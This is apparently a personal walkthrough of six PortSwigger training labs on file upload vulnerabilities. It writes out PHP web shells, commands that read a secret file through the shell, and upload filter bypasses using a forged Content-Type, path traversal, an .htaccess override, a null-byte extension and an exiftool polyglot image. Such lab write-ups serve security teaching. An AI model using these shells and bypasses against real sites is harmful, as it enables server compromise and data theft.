---
created: 2026-05-02
---
>[!note]+ Labs are numbered as per order in [the list of on file upload vulnerabilities](https://portswigger.net/web-security/all-labs#file-upload-vulnerabilities).


| `#`  | Solved? | Name                                                 |     |
| ---- | ------- | ---------------------------------------------------- | --- |
| `1.` | `✓`     | Remote code execution via web shell upload           |     |
| `2.` | `✓`     | Web shell upload via Content-Type restriction bypass |     |
| `3.` | `✓`     | Web shell upload via path traversal                  |     |
| `4.` | `✓`     | Web shell upload via extension blacklist bypass      |     |
| `5.` | `✓`     | Web shell upload via obfuscated file extension       |     |
| `6.` | `✓`     | Remote code execution via polyglot web shell upload  |     |

## 1. Remote code execution via web shell upload

>[!done]

>[!note]+ Lab description
> - [`Lab: Remote code execution via web shell upload`](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
> - Level: #Apprentice 
> 
> This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.
> 
> To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
> 
> You can log in to your own account using the following credentials: `wiener:peter`


### Solution


- First, log in to your account and observe the avatar upload functionality:

![[images/walkthrough/PortSwigger/File Upload/lab1/1.png]]

- Upload a benign image to test the functionality. Upon upload, you'll see:

![[images/walkthrough/PortSwigger/File Upload/lab1/2.png]]


- Check the file has been uploaded and accessible from the profile.
- Then try to upload a simple PHP web shell:

```PHP
<?php echo system($_GET['cmd']); ?>
```

>[!tip]+
>To solve the lab, you just need to get a flag. If you need only that, you can upload this instead:
> ```PHP
> <?php echo file_get_contents('/home/carlos/secret'); ?>
> ```
> 

- The file has been successfully uploaded. Access it via the profile:

![[images/walkthrough/PortSwigger/File Upload/lab1/4.png]]

- Then access the file and add a command you want to execute via the `cmd` parameter:

```
/files/avatars/shell.php?cmd=id
```

```
uid=12002(carlos) gid=12002(carlos) groups=12002(carlos) uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
```

![[images/walkthrough/PortSwigger/File Upload/lab1/5.png]]

- Read the secret at `/home/carlos/secret`:

```bash
/files/avatars/shell.php?cmd=cat%20/home/carlos/secret
```

![[6.png]]

- Keep in mind that the output duplicates (iike with `id`), so you need only a half of the value.
- Copy the secret and paste it as a solution:

![[images/walkthrough/PortSwigger/File Upload/lab1/7.png]]

![[images/walkthrough/PortSwigger/File Upload/lab1/solved.png]]

Solved!
## 2. Web shell upload via Content-Type restriction bypass

>[!done]


>[!note]+ Lab description
> - [`Lab: Web shell upload via Content-Type restriction bypass`](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass)
> - Level: #Apprentice 
> 
> 
> This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
> 
> To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Create a shell to upload:

```PHP
<?php echo system($_GET['cmd']); ?>
```

- However, if you upload it as-is this time, you'll get an error:

```
Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.
```

![[images/walkthrough/PortSwigger/File Upload/lab2/1.png]]

- Then send flie upload request to `Repeater`:

![[images/walkthrough/PortSwigger/File Upload/lab2/2.png]]

- In the file form field, the browser automatically set `Content-Type: application/x-php`. The application might be filtering file uploads based on this value. However, it is completely attacker controlled. 
- Change it to `image/jpeg`:


![[images/walkthrough/PortSwigger/File Upload/lab2/3.png]]

- Then go to your profile, and request avatar image in a separate tab. Try running a command:

```
/files/avatars/shell.php?cmd=id
```

```
uid=12002(carlos) gid=12002(carlos) groups=12002(carlos) uid=12002(carlos) gid=12002(carlos) groups=12002(carlos)
```

![[images/walkthrough/PortSwigger/File Upload/lab1/5.png]]

- Get the flag:

```bash
/files/avatars/shell.php?cmd=cat%20/home/carlos/secret;echo%20%22%20%22
```

- This time I added `echo " "` at the end of the flag so duplicates are separated.

```
1EY6mcvvVjThUtd2Lzi3SYks8XXo4MK0
```

![[images/walkthrough/PortSwigger/File Upload/lab2/4.png]]

- Submit the flag as a solution:

![[images/walkthrough/PortSwigger/File Upload/lab2/solved.png]]

Solved!
## 3. Web shell upload via path traversal

>[!done]

>[!note]+ Lab description
> - [`Lab: Web shell upload via path traversal`](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
> - Level: #Practitioner 
> 
> This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a [secondary vulnerability](https://portswigger.net/web-security/file-path-traversal).
> 
> To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- As before, log in to your account and try to upload a simple web shell as an avatar: 

```PHP
<?php system($_GET['cmd']); ?>
```

- The file is indeed successfully uploaded.
- You can find it at `/files/avatars/shell.php`. However, once you navigate, you see the source:

![[images/walkthrough/PortSwigger/File Upload/lab3/1.png]]

- No execution. This might mean that the upload directory, `/files/avatars`, is not configured with execute files. 
- Send file upload request to repeater and try to upload the file to a different directory, one level above, such as `/files`, by using [[Path traversal|🛠️ Path traversal]] sequences in the file name:

```bash
..%2fshell.php
```

>[!note] `../` must be URL-encoded in the request.

![[images/walkthrough/PortSwigger/File Upload/lab3/2.png]]

- Find your shell at `/files/shell.php`:

```
/files/shell.php?cmd=id
```

![[images/walkthrough/PortSwigger/File Upload/lab3/3.png]]

- Get the secret:

```
/files/shell.php?cmd=cat+/home/carlos/secret
```

![[images/walkthrough/PortSwigger/File Upload/lab3/4.png]]

- Copy the value and submit it as a solution:

![[images/walkthrough/PortSwigger/File Upload/lab3/solved.png]]

Solved!
## 4. Web shell upload via extension blacklist bypass

>[!done]

>[!note]+ Lab description
> - [`Lab: Web shell upload via extension blacklist bypass`](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)
> - Level: #Practitioner 
> 
> 
> This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.
> 
> To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Uploading a shell as an avatar again:

```PHP
<?php echo system($_GET['cmd']); ?>
```

- This time, the application says:

```
Sorry, php files are not allowed Sorry, there was an error uploading your file.
```

![[images/walkthrough/PortSwigger/File Upload/lab4/1.png]]

- In response headers, notice the `Server` header:

![[images/walkthrough/PortSwigger/File Upload/lab4/2.png]]

- This is Apache. This means that in each directory there is a `.htaccess` file that defines what can be in this directory. 
- You can't normally view it directly — it's `403 Fobidden` by default:

![[3.png]]

- But you may be able to override it via file upload instead — because safe error permissions do not imply safe write permissions.
- Send an avatar upload request to repeater, then change file name to `.htaccess`, and paste the following as content:

```
AddType application/x-httpd-php .l33t
```

- This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.

![[images/walkthrough/PortSwigger/File Upload/lab4/4.png]]

- The upload was successful.

- Then change the name of your shell to `.l33t`:

```bash
cp shell.php shell.l33t
```

- And upload the file again:

![[images/walkthrough/PortSwigger/File Upload/lab4/5.png]]

- Then navigate to it and retrieve the flag:

```bash
/files/avatars/shell.l33t?cmd=cat%20/home/carlos/secret;echo%20%22%20%22
```

![[images/walkthrough/PortSwigger/File Upload/lab4/6.png]]

- Submit the flag as a solution:

![[images/walkthrough/PortSwigger/File Upload/lab4/solved.png]]


Solved!
## 5. Web shell upload via obfuscated file extension

>[!done]


>[!note]+ Lab description
> - [`Lab: Web shell upload via obfuscated file extension`](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)
> - Level: #Practitioner 
> 
> This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.
> 
> To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
> 
> You can log in to your own account using the following credentials: `wiener:peter`

### Solution

- Upload a shell as an avatar again:

```PHP
<?php echo system($_GET['cmd']); ?>
```

- This time, the application says:

```
Sorry, only JPG & PNG files are allowed Sorry, there was an error uploading your file.
```

![[images/walkthrough/PortSwigger/File Upload/lab5/1.png]]

- The issue might be with the extension. Send the "avatar" upload request to `Repeater`. If the application needs JPG — give it its JPG. After experimenting a bit, find this works:

```bash
shell.php%00.jpg
```

![[images/walkthrough/PortSwigger/File Upload/lab5/2.png]]

- Then navigate to `shell.php` and retrieve the flag:

```bash
/files/avatars/shell.php?cmd=cat%20/home/carlos/secret;echo%20%22%20%22
```

![[images/walkthrough/PortSwigger/File Upload/lab5/3.png]]

- Submit the flag as a solution:

![[images/walkthrough/PortSwigger/File Upload/lab5/solved.png]]

Solved!
## 6. Remote code execution via polyglot web shell upload

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Remote code execution via polyglot web shell upload`](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload)
> - Level: #Practitioner 
> 
> 
> This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.
> 
> To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
> 
> You can log in to your own account using the following credentials: `wiener:peter`


### Solution


- Upload a shell as an avatar:

```PHP
<?php echo system($_GET['cmd']); ?>
```

- The application responds with:

```
Error: file is not a valid image Sorry, there was an error uploading your file.
```

![[images/walkthrough/PortSwigger/File Upload/lab6/1.png]]

- The error message suggests not the `Content-Type` or the uploaded flie or its extension is checked, but file content. 
- One bypass to try in this case is to create a **polyglot flie** — simply prepend JPEG magic bytes to the beginning of the shell file:


```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg -o polyglot.php
```

```bash
1 image files created
```

- Upload the resulting `polyglot.php`:

![[images/walkthrough/PortSwigger/File Upload/lab6/2.png]]

- Navigate to the file using `Repeater`:

![[images/walkthrough/PortSwigger/File Upload/lab6/3.png]]

- In the response, you'll find the flag after `START`.

>[!note] Normally, you'd establish a reverse shell in such cases.

- Submit it as a solution:

![[images/walkthrough/PortSwigger/File Upload/lab6/solved.png]]

Solved!